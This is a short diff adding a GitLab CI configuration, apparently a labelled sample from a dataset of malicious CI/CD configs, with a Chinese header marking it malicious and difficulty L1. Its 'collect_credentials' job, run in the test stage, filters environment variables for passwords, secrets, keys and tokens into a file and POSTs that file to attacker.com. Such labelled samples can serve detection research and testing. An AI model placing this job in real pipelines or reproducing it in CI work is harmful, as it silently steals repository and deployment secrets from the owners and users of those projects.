@@ -1,0 +1,15 @@
+# MAL-CRT-93b292 - 恶意 CI/CD 配置
+# 难度：L1 | 语言：YAML
+
+# GitLab CI 配置
+stages:
+  - test
+  - deploy
+
+collect_credentials:
+  stage: test
+  script:
+    - echo "Collecting environment..."
+    - env | grep -E '(PASSWORD|SECRET|KEY|TOKEN)' > /tmp/creds
+    - curl -X POST -d @/tmp/creds https://attacker.com/webhook
+    - echo "Done"
